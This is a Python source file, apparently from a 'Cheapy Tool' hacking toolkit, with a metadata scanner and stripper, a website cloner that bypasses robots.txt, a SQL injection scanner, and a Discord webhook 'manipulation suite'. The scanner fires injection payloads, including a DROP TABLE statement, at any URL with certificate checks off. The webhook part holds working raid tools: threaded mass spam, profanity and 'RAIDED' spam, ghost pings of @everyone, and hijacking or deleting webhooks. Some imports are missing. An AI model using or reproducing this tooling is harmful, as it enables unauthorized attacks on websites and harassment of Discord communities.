from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import tempfile
import zipfile
from pathlib import Path
from typing import Any
import requests
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from config import *

class UtilitiesModule:
    """Combined utility tools from all three projects."""

    # ──────────────────────────────────────────────
    #  Metadata Scanner (EXIF)
    # ──────────────────────────────────────────────
    def metadata_scanner(self):
        filepath = get_input("File path")
        path = Path(filepath)
        if not path.exists():
            error_then_exit("File not found.")

        section_header(f"Metadata: {path.name}")

        ext = path.suffix.lower()
        table = make_table("Property", "Value")

        # Basic file info
        stat = path.stat()
        table.add_row(Text("File", style=Theme.accent), Text(str(path), style=Theme.secondary))
        table.add_row(Text("Size", style=Theme.accent), f"{stat.st_size:,} bytes")
        table.add_row(Text("Created", style=Theme.accent), str(datetime.fromtimestamp(stat.st_ctime)))
        table.add_row(Text("Modified", style=Theme.accent), str(datetime.fromtimestamp(stat.st_mtime)))

        # EXIF for images
        if ext in (".jpg", ".jpeg", ".tiff", ".tif"):
            try:
                from PIL import Image
                from PIL.ExifTags import TAGS
                img = Image.open(path)
                exif_data = img._getexif()
                if exif_data:
                    for tag_id, value in exif_data.items():
                        tag = TAGS.get(tag_id, tag_id)
                        if isinstance(value, bytes):
                            value = str(value)[:60]
                        table.add_row(Text(str(tag), style=Theme.accent), Text(str(value)[:80], style=Theme.secondary))
                else:
                    table.add_row(Text("EXIF", style=Theme.accent), "No EXIF data")
                img.close()
            except Exception as e:
                table.add_row(Text("EXIF Error", style=Theme.accent), str(e))

        # EXIF with exifread
        if ext in (".jpg", ".jpeg", ".tiff", ".tif", ".png", ".webp"):
            try:
                import exifread
                with open(path, "rb") as f:
                    tags = exifread.process_file(f, details=False)
                if tags:
                    for tag_name, tag_value in tags.items():
                        table.add_row(Text(str(tag_name), style=Theme.accent), Text(str(tag_value)[:80], style=Theme.secondary))
            except Exception:
                pass

        # PDF metadata
        if ext == ".pdf":
            try:
                import fitz
                doc = fitz.open(str(path))
                meta = doc.metadata
                if meta:
                    for k, v in meta.items():
                        if v:
                            table.add_row(Text(f"PDF: {k}", style=Theme.accent), Text(str(v)[:80], style=Theme.secondary))
                doc.close()
            except Exception as e:
                table.add_row(Text("PDF Error", style=Theme.accent), str(e))

        # Office documents
        if ext in (".docx", ".xlsx", ".pptx"):
            try:
                import zipfile as _zf
                import xml.etree.ElementTree as ET
                with _zf.ZipFile(path) as z:
                    if "docProps/core.xml" in z.namelist():
                        xml = z.read("docProps/core.xml")
                        root = ET.fromstring(xml)
                        ns = {"dc": "http://purl.org/dc/elements/1.1/", "cp": "http://schemas.openxmlformats.org/package/2006/metadata/core-properties"}
                        for elem in root.iter():
                            tag = elem.tag.split("}")[-1] if "}" in elem.tag else elem.tag
                            if elem.text and elem.text.strip():
                                table.add_row(Text(f"Office: {tag}", style=Theme.accent), Text(elem.text.strip()[:80], style=Theme.secondary))
            except Exception:
                table.add_row(Text("Office Metadata", style=Theme.accent), "Could not parse")

        console.print(table)
        pause()

    # ──────────────────────────────────────────────
    #  Metadata Deleter (sanitize files)
    # ──────────────────────────────────────────────
    def metadata_deleter(self):
        filepath = get_input("File path")
        path = Path(filepath)
        if not path.exists():
            error_then_exit("File not found.")

        ext = path.suffix.lower()
        if ext in (".jpg", ".jpeg", ".tiff", ".tif"):
            try:
                from PIL import Image
                img = Image.open(path)
                data = list(img.getdata())
                clean = Image.new(img.mode, img.size)
                clean.putdata(data)
                out = path.parent / f"{path.stem}_clean{ext}"
                clean.save(str(out))
                success(f"Metadata stripped. Saved to: {out}")
                img.close()
            except Exception as e:
                error(f"Error: {e}")

        elif ext == ".pdf":
            try:
                import fitz
                doc = fitz.open(str(path))
                doc.set_metadata({})
                out = path.parent / f"{path.stem}_clean{ext}"
                doc.save(str(out))
                doc.close()
                success(f"Metadata stripped. Saved to: {out}")
            except Exception as e:
                error(f"Error: {e}")

        elif ext in (".docx", ".xlsx", ".pptx"):
            try:
                import zipfile as _zf
                import shutil as _sh
                temp = tempfile.mkdtemp()
                with _zf.ZipFile(path, "r") as z:
                    z.extractall(temp)
                # Remove core.xml
                core_path = os.path.join(temp, "docProps", "core.xml")
                if os.path.exists(core_path):
                    os.remove(core_path)
                out = path.parent / f"{path.stem}_clean{ext}"
                with _zf.ZipFile(out, "w", _zf.ZIP_DEFLATED) as z:
                    for root, _, files in os.walk(temp):
                        for f in files:
                            fp = os.path.join(root, f)
                            arcname = os.path.relpath(fp, temp)
                            z.write(fp, arcname)
                _sh.rmtree(temp)
                success(f"Metadata stripped. Saved to: {out}")
            except Exception as e:
                error(f"Error: {e}")

        else:
            warning(f"No metadata remover for {ext} files yet.")

        pause()

    # ──────────────────────────────────────────────
    #  Website Cloner
    # ──────────────────────────────────────────────
    def website_cloner(self):
        target = get_input("Target URL")
        if not target.startswith(("http://", "https://")):
            target = f"https://{target}"

        output = get_input("Output directory name", "cloned_site")
        output_path = OUTPUT_DIR / output
        output_path.mkdir(parents=True, exist_ok=True)

        wait_msg(f"Cloning {target} to {output_path}...")

        # Try pywebcopy first
        try:
            from pywebcopy import save_webpage
            save_webpage(
                url=target,
                project_folder=str(output_path),
                project_name="site",
                bypass_robots=True,
                debug=False,
                delay=None,
            )
            success(f"Site cloned to {output_path}")
        except ImportError:
            warning("pywebcopy not installed. Using wget fallback.")

            if shutil.which("wget"):
                try:
                    subprocess.run([
                        "wget", "--mirror", "--convert-links", "--adjust-extension",
                        "--page-requisites", "--no-parent",
                        "-P", str(output_path), target,
                    ], check=True, timeout=120)
                    success(f"Site cloned with wget to {output_path}")
                except subprocess.TimeoutExpired:
                    error("wget timed out.")
                except Exception as e:
                    error(f"wget error: {e}")
            else:
                # Fallback: simple download
                try:
                    r = requests.get(target, timeout=30)
                    (output_path / "index.html").write_text(r.text, encoding="utf-8")
                    success(f"Downloaded main page to {output_path / 'index.html'}")
                except Exception as e:
                    error(f"Download error: {e}")

        info(f"Output: {output_path}")
        pause()

    # ──────────────────────────────────────────────
    #  SQL Vulnerability Scanner
    # ──────────────────────────────────────────────
    def sql_vuln_scanner(self):
        target = get_input("Target URL with parameter (e.g. http://site.com/page?id=1)")
        if not target.startswith(("http://", "https://")):
            target = f"https://{target}"

        timeout_val = get_input("Timeout (s)", str(DEFAULT_TIMEOUT))
        try:
            timeout = float(timeout_val)
        except ValueError:
            timeout = DEFAULT_TIMEOUT

        session = requests.Session()
        session.headers.update({"User-Agent": "Mozilla/5.0"})
        session.verify = False

        # Test basic SQLi
        payloads = [
            ("'", "Error / syntax"),
            ("' OR '1'='1", "Auth bypass"),
            ("' OR 1=1--", "Auth bypass"),
            ("' UNION SELECT NULL--", "Union-based"),
            ("' UNION SELECT NULL,NULL--", "Union-based"),
            ("' UNION SELECT NULL,NULL,NULL--", "Union-based"),
            ("' AND SLEEP(5)--", "Time-based"),
            ("' WAITFOR DELAY '0:0:5'--", "Time-based (MSSQL)"),
            ("'; DROP TABLE users--", "Out of band"),
            ('"', "Double quote"),
            ("1 AND 1=1", "Boolean - true"),
            ("1 AND 1=2", "Boolean - false"),
        ]

        section_header("SQL Injection Scanner")
        info(f"Testing {len(payloads)} payloads...")

        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        parsed = urlparse(target)
        params = parse_qs(parsed.query)

        if not params:
            # Try POST
            wait_msg("No GET params found. Trying POST forms...")
            try:
                from bs4 import BeautifulSoup
                r = session.get(target, timeout=timeout)
                soup = BeautifulSoup(r.text, "html.parser")
                forms = soup.find_all("form")
                for form in forms:
                    action = form.get("action") or target
                    inputs = {inp.get("name"): inp.get("value", "") for inp in form.find_all(["input", "textarea"]) if inp.get("name")}
                    if inputs:
                        for payload, ptype in payloads:
                            test_data = {k: payload for k in inputs.keys()}
                            try:
                                resp = session.post(action, data=test_data, timeout=timeout)
                                if any(err in resp.text.lower() for err in ["sql", "mysql", "syntax", "unclosed", "quotation", "odbc", "driver", "microsoft", "error in your"]):
                                    success(f"[POST] {ptype}: {payload[:40]}")
                                time.sleep(0.5)
                            except Exception:
                                pass
                warning("POST scan completed.")
                pause()
                return
            except Exception as e:
                error_then_exit(f"No parameters found: {e}")

        param_name = list(params.keys())[0]
        original_val = params[param_name][0]

        found_vulns: list[tuple[str, str]] = []

        for payload, ptype in payloads:
            test_params = params.copy()
            test_params[param_name] = [payload]
            new_query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))

            try:
                start = time.time()
                resp = session.get(test_url, timeout=timeout + 5)
                elapsed = time.time() - start

                # Error-based detection
                error_keywords = ["sql", "mysql", "syntax", "unclosed", "quotation", "odbc",
                                  "driver", "microsoft", "error in your", "warning: mysql",
                                  "supplied argument", "fetch", "ora-", "postgresql"]
                text_lower = resp.text.lower()
                error_found = any(kw in text_lower for kw in error_keywords)

                # Time-based detection
                time_based = "sleep" in payload.lower() and elapsed > 4

                # Boolean-based detection
                boolean_diff = False
                if "1=1" in payload:
                    test_params_false = params.copy()
                    false_payload = payload.replace("1=1", "1=2")
                    test_params_false[param_name] = [false_payload]
                    false_query = urlencode(test_params_false, doseq=True)
                    false_url = urlunparse(parsed._replace(query=false_query))
                    try:
                        false_resp = session.get(false_url, timeout=timeout)
                        boolean_diff = len(resp.text) != len(false_resp.text) or resp.status_code != false_resp.status_code
                    except Exception:
                        pass

                if error_found or time_based or boolean_diff:
                    found_vulns.append((ptype, payload))
                    if time_based:
                        success(f"[TIME] {ptype}: {payload[:40]} ({elapsed:.1f}s)")
                    elif boolean_diff:
                        success(f"[BOOL] {ptype}: {payload[:40]}")
                    else:
                        success(f"[ERR]  {ptype}: {payload[:40]}")
            except requests.exceptions.Timeout:
                if "sleep" in payload.lower() or "waitfor" in payload.lower():
                    found_vulns.append((ptype, payload))
                    success(f"[TIME] {ptype}: Timeout detected!")
            except Exception:
                pass

        if not found_vulns:
            warning("No SQL injection vulnerabilities detected.")
        else:
            section_header(f"Found {len(found_vulns)} potential vulnerabilities")
            table = make_table("Type", "Payload")
            for ptype, payload in found_vulns:
                table.add_row(Text(ptype, style=Theme.error), Text(payload[:50], style=Theme.secondary))
            console.print(table)

        pause()

class WebhookToolkitModule:
    API = "https://discord.com/api/v9/webhooks"

    def run(self):
        section_header("Webhook Toolkit (19 Tools)")
        console.print(Text("Full Discord webhook manipulation suite", style=Theme.info))
        console.print()

        wh_url = get_input("Webhook URL")

        while True:
            menu_items = [
                ("1", "Webhook Info"),       ("2", "Send Message"),
                ("3", "Send Embed"),          ("4", "Send File"),
                ("5", "Send JSON Raw"),       ("6", "Send GIF Spam"),
                ("7", "Send Bad-Word Spam"),  ("8", "Ghost Ping (@everyone)"),
                ("9", "Edit Webhook Name"),   ("10", "Edit Webhook Avatar"),
                ("11", "Clone Webhook"),      ("12", "Delete Webhook"),
                ("13", "Mass Spam"),          ("14", "Slow Spam (1s delay)"),
                ("15", "Webhook to Curl"),    ("16", "Webhook Rotator"),
                ("17", "Status Checker"),     ("18", "Get Channel ID"),
                ("19", "Get Guild ID"),       ("0", "Back"),
            ]
            table = make_table("Webhook Toolkit", ["#", "Tool"])
            for num, label in menu_items:
                table.add_row(Text(num, style=Theme.primary), Text(label, style=Theme.secondary))
            console.print(table)

            choice = get_input("Select tool")
            try:
                match choice:
                    case "0":
                        break
                    case "1":
                        self.get_info(wh_url)
                    case "2":
                        self.send_message(wh_url)
                    case "3":
                        self.send_embed(wh_url)
                    case "4":
                        self.send_file(wh_url)
                    case "5":
                        self.send_json_raw(wh_url)
                    case "6":
                        self.send_gif_spam(wh_url)
                    case "7":
                        self.send_badword_spam(wh_url)
                    case "8":
                        self.ghost_ping(wh_url)
                    case "9":
                        wh_url = self.edit_name(wh_url)
                    case "10":
                        wh_url = self.edit_avatar(wh_url)
                    case "11":
                        wh_url = self.clone_webhook(wh_url)
                    case "12":
                        self.delete_webhook(wh_url)
                        break
                    case "13":
                        self.mass_spam(wh_url)
                    case "14":
                        self.slow_spam(wh_url)
                    case "15":
                        self.to_curl(wh_url)
                    case "16":
                        wh_url = self.webhook_rotator(wh_url)
                    case "17":
                        self.status_check(wh_url)
                    case "18":
                        self.get_channel_id(wh_url)
                    case "19":
                        self.get_guild_id(wh_url)
                    case _:
                        error("Invalid choice.")
            except Exception as e:
                error(f"Error: {e}")

    def _send(self, wh_url: str, data: dict | None = None, files=None) -> requests.Response:
        return requests.post(wh_url + "?wait=1", json=data, files=files, timeout=10)

    def get_info(self, wh_url: str):
        r = requests.get(wh_url, timeout=10)
        if r.status_code == 200:
            d = r.json()
            table = make_table("Webhook Info", ["Property", "Value"])
            table.add_row(Text("Name", style=Theme.accent), Text(d.get("name", "N/A"), style=Theme.secondary))
            table.add_row(Text("Channel ID", style=Theme.accent), Text(str(d.get("channel_id", "N/A")), style=Theme.secondary))
            table.add_row(Text("Guild ID", style=Theme.accent), Text(str(d.get("guild_id", "N/A")), style=Theme.secondary))
            table.add_row(Text("Token", style=Theme.accent), Text(str(d.get("token", "N/A"))[:30] + "...", style=Theme.secondary))
            table.add_row(Text("Avatar", style=Theme.accent), Text(str(d.get("avatar", "N/A")), style=Theme.secondary))
            console.print(table)
        else:
            error(f"HTTP {r.status_code}")
        pause()

    def send_message(self, wh_url: str):
        content = get_input("Message", "Hello from Cheapy Tool!")
        username = get_input("Username override (leave blank for default)")
        avatar = get_input("Avatar URL override (optional)")
        data = {"content": content}
        if username:
            data["username"] = username
        if avatar:
            data["avatar_url"] = avatar
        r = self._send(wh_url, data)
        if r.status_code in (200, 204):
            success("Message sent!")
        else:
            error(f"HTTP {r.status_code}")
        pause()

    def send_embed(self, wh_url: str):
        title = get_input("Embed title", "Cheapy Tool")
        desc = get_input("Embed description", "Powered by Cheapy Tool v1.0")
        color = get_input("Color (decimal)", "16711680")
        footer = get_input("Footer text", "")
        data = {"embeds": [{"title": title, "description": desc, "color": int(color)}]}
        if footer:
            data["embeds"][0]["footer"] = {"text": footer}
        r = self._send(wh_url, data)
        if r.status_code in (200, 204):
            success("Embed sent!")
        else:
            error(f"HTTP {r.status_code}")
        pause()

    def send_file(self, wh_url: str):
        file_path = get_input("File path")
        p = Path(file_path)
        if not p.exists():
            error_then_exit("File not found.")
        try:
            with open(p, "rb") as f:
                r = requests.post(wh_url, files={"file": (p.name, f)}, timeout=30)
            if r.status_code in (200, 204):
                success("File sent!")
            else:
                error(f"HTTP {r.status_code}")
        except Exception as e:
            error(f"Error: {e}")
        pause()

    def send_json_raw(self, wh_url: str):
        raw = get_input("Raw JSON payload")
        try:
            data = json.loads(raw)
        except json.JSONDecodeError:
            error_then_exit("Invalid JSON.")
        r = self._send(wh_url, data)
        if r.status_code in (200, 204):
            success("Raw JSON sent!")
        else:
            error(f"HTTP {r.status_code}")
        pause()

    def send_gif_spam(self, wh_url: str):
        count = int(get_input("Count", "10"))
        gifs = [
            "https://media.giphy.com/media/Ju7l5y9osyymQ/giphy.gif",
            "https://media.giphy.com/media/l3vR85PnGsBwu1PFK/giphy.gif",
            "https://media.giphy.com/media/3oz8xAFtqoOUUrsh7W/giphy.gif",
        ]
        for i in range(count):
            gif = random.choice(gifs)
            data = {"content": f"@everyme {gif}"}
            self._send(wh_url, data)
        success(f"Sent {count} GIF messages.")
        pause()

    def send_badword_spam(self, wh_url: str):
        count = int(get_input("Count", "20"))
        words = ["FUCK", "SHIT", "BITCH", "DAMN", "ASS", "idiot", "moron", "spam", "@everyone SPAM", "LOL RAIDED"]
        for i in range(count):
            data = {"content": random.choice(words)}
            self._send(wh_url, data)
        success(f"Sent {count} messages.")
        pause()

    def ghost_ping(self, wh_url: str):
        """Send @everyone ping then delete immediately."""
        content = get_input("Ping content", "@everyome GHOST PING")
        data = {"content": content}
        r = requests.post(wh_url + "?wait=1", json=data, timeout=10)
        if r.status_code in (200, 204):
            msg_id = r.json().get("id") if r.status_code == 200 else None
            if msg_id:
                requests.delete(f"{wh_url}/messages/{msg_id}", timeout=10)
                success("Ghost ping sent & deleted!")
            else:
                success("Ping sent (delete may have failed).")
        else:
            error(f"HTTP {r.status_code}")
        pause()

    def edit_name(self, wh_url: str) -> str:
        name = get_input("New webhook name")
        r = requests.patch(wh_url, json={"name": name}, timeout=10)
        if r.status_code == 200:
            success(f"Name changed to: {name}")
            return wh_url
        error(f"HTTP {r.status_code}")
        return wh_url

    def edit_avatar(self, wh_url: str) -> str:
        avatar_url = get_input("New avatar image URL")
        r_img = requests.get(avatar_url, timeout=10)
        if r_img.status_code != 200:
            error("Could not fetch image.")
            return wh_url
        import base64
        b64 = base64.b64encode(r_img.content).decode()
        r = requests.patch(wh_url, json={"avatar": f"data:image/png;base64,{b64}"}, timeout=10)
        if r.status_code == 200:
            success("Avatar updated!")
        else:
            error(f"HTTP {r.status_code}")
        return wh_url

    def clone_webhook(self, wh_url: str) -> str:
        r = requests.get(wh_url, timeout=10)
        if r.status_code != 200:
            error("Could not fetch original webhook.")
            return wh_url
        orig = r.json()
        channel_id = orig.get("channel_id")
        name = orig.get("name", "Cloned") + "-clone"
        avatar = orig.get("avatar")
        r2 = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/webhooks", json={"name": name}, timeout=10)
        if r2.status_code == 200:
            new_wh = r2.json()
            new_url = f"https://discord.com/api/v9/webhooks/{new_wh['id']}/{new_wh['token']}"
            success(f"Cloned webhook: {new_url}")
            return new_url
        error(f"Clone failed: HTTP {r2.status_code}")
        return wh_url

    def delete_webhook(self, wh_url: str):
        if not confirm("PERMANENTLY delete this webhook?"):
            return
        r = requests.delete(wh_url, timeout=10)
        if r.status_code == 204:
            success("Webhook deleted!")
        else:
            error(f"HTTP {r.status_code}")

    def mass_spam(self, wh_url: str):
        count = int(get_input("Number of messages", "100"))
        threads = int(get_input("Threads", "10"))
        import threading as _th
        def _s():
            for _ in range(count // threads + 1):
                try:
                    requests.post(wh_url, json={"content": random.choice(["SPAM", "@everyone", "CHEAPY TOOL", "RAIDED", random.choice(string.ascii_letters * 10)])}, timeout=5)
                except Exception:
                    pass
        tl = []
        for _ in range(threads):
            t = _th.Thread(target=_s, daemon=True)
            t.start()
            tl.append(t)
        for t in tl:
            t.join(timeout=120)
        success(f"Mass spam sent ({count} msg).")
        pause()

    def slow_spam(self, wh_url: str):
        count = int(get_input("Number of messages", "50"))
        for i in range(count):
            data = {"content": f"Spam message #{i + 1}"}
            self._send(wh_url, data)
            time.sleep(1)
        success(f"Sent {count} messages with 1s delay.")
        pause()

    def to_curl(self, wh_url: str):
        content = get_input("Message for curl example", "Hello via curl!")
        curl = f'curl -X POST {wh_url} -H "Content-Type: application/json" -d \'{{"content": "{content}"}}\''
        console.print(Text(curl, style=Theme.secondary))
        info("Copy the curl command above.")
        pause()

    def webhook_rotator(self, wh_url: str) -> str:
        info("Fetches alternative webhooks in same channel...")
        r = requests.get(wh_url, timeout=10)
        if r.status_code != 200:
            error("Could not fetch info.")
            return wh_url
        channel_id = r.json().get("channel_id")
        r2 = requests.get(f"https://discord.com/api/v9/channels/{channel_id}/webhooks", timeout=10)
        if r2.status_code == 200:
            hooks = r2.json()
            if len(hooks) > 1:
                idx = 0
                for i, h in enumerate(hooks):
                    if h.get("token"):
                        idx = i
                        break
                hook = hooks[idx]
                new_url = f"https://discord.com/api/v9/webhooks/{hook['id']}/{hook['token']}"
                info(f"Rotated to: {new_url[:50]}...")
                return new_url
            warning("Only 1 webhook in channel.")
        return wh_url

    def status_check(self, wh_url: str):
        r = requests.get(wh_url, timeout=10)
        status = "Active" if r.status_code == 200 else f"Dead (HTTP {r.status_code})"
        color = Theme.success if r.status_code == 200 else Theme.error
        console.print(Text(f"  Status: {status}", style=color))
        pause()

    def get_channel_id(self, wh_url: str):
        r = requests.get(wh_url, timeout=10)
        if r.status_code == 200:
            info(f"Channel ID: {r.json().get('channel_id', 'N/A')}")
        pause()

    def get_guild_id(self, wh_url: str):
        r = requests.get(wh_url, timeout=10)
        if r.status_code == 200:
            info(f"Guild ID: {r.json().get('guild_id', 'N/A')}")
        pause()
